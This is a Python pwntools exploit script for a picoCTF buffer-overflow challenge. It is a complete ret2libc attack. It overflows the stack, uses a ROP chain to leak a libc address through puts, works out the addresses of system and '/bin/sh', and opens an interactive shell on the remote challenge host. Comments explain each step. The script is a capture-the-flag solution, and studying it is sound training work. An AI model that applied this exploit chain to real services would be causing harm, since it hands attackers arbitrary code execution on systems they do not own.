#!/usr/bin/python3
from pwn import *

# ###############################################################################
# WORKS ON REMOTE MACHINE BUT NOT LOCALLY (SOMETHING ABOUT RECV LEAKED ADDRESSES)
# ###############################################################################
elf = context.binary = ELF("vuln_patched")

gs = '''
b main
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("mercury.picoctf.net", 42072)
    else:
        return process(elf.path)

io = start()

offset = b"A"*136

# func addr
setvbuf_addr = 0x400560
do_stuff_addr = 0x4006d8
puts_addr = 0x400540
puts_got = 0x601018

# rop gadgets
pop_rdi_ret = 0x400913
ret = 0x40052e

print(io.recvuntil(b"sErVeR!"))
io.recvline()
payload = offset
payload += p64(pop_rdi_ret)
payload += p64(puts_got) # Has to be global offset table
payload += p64(puts_addr)
payload += p64(do_stuff_addr) # ret to main to avoid crash
io.sendline(payload)
print(io.recvline())
leak = u64(io.recvline().strip().ljust(8, b"\x00")) # this line and the one below are used to convert to readable addr
log.info("puts @ %s" % hex(leak))

# Since the libc provided by pico has pie and all other protection mechanisms active
# we need to leak an address and do some calculations

# calulate libc offset. Found the offset of puts from libc base
# found it using readelf -s libc.so.6 | grep puts (the libc.so.6 provided by pico)
puts_offset = 0x80a30
libc_base = leak - puts_offset

# calculate system addr
system_offset = 0x4f4e0 # readelf -s libc.so.6 | grep system
system_addr = libc_base + system_offset 

log.info("system @ %s" % hex(system_addr))

# find "/bin/sh" in libc so we don't have to provide it
# strings -a -t x libc.so.6 | grep "/bin/sh"
binsh_offset = 0x1b40fa
binsh_addr = libc_base + binsh_offset

# final rop chain
payload = offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(ret) # to align stack to 16 bytes or system will crash
payload += p64(system_addr)

io.sendline(payload)

io.interactive()
